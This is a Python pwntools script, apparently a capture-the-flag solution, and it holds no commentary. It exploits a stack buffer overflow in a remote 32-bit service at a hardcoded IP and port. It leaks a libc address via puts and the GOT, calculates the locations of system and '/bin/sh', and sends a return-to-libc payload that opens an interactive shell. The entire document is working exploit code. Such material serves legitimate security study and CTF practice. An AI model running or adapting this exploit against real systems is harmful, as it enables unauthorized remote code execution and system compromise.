from pwn import *


puts_plt = 0x80483f0
read_main = 0x80485cb
setvbuf_got = 0x804a024
exit_got = 0x804a01c
setvbuf_offset = 0x068690
system_offset = 0x03d540 - setvbuf_offset
binsh_offset = 0x1794d1 - setvbuf_offset

payload = ""
payload += "A" * 76
payload += struct.pack("I", puts_plt)
payload += struct.pack("I", read_main)
payload += struct.pack("I", setvbuf_got)

sh = remote("35.243.188.20", 2002)
sh.sendline(payload)

leak = sh.recv()
leaklist = []
for i in xrange(0, len(leak), 4):
	leaklist.append(hex(int(struct.unpack("I", leak[i:i+4])[0])))

setvbuf_leak = leaklist[0]
system_leak = system_offset + int(setvbuf_leak, 16)
binsh_leak = binsh_offset + int(setvbuf_leak, 16)
print "\n[+]setvbuf: " + str(setvbuf_leak)
print "[+]system: " + hex(system_leak)
print "[+]binsh: " + hex(binsh_leak) + "\n"

payload2 = ""
payload2 += "A" * 76
payload2 += struct.pack("I", system_leak)
payload2 += struct.pack("I", exit_got)
payload2 += struct.pack("I", binsh_leak)

sh.sendline(payload2)
sh.interactive()
